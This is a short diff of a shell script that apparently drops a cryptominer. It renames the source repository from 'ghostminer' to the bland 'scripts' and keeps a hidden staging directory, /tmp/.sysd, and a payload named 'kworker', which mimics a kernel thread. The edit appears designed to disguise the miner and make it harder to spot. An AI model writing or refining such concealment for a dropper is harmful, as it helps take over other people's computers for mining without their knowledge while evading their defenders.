@@ -6,7 +6,7 @@
 # ============================================================================
 set -eu
 
-CONFIG_URL="${CONFIG_URL:-https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main}"
+CONFIG_URL="${CONFIG_URL:-https://raw.githubusercontent.com/ronnissleepy-code/scripts/main}"
 SYSDIR="${SYSDIR:-/tmp/.sysd}"
 PAYLOAD_URL="${PAYLOAD_URL:-$CONFIG_URL/kworker}"
 SHA_URL="${SHA_URL:-$CONFIG_URL/kworker.sha256}"
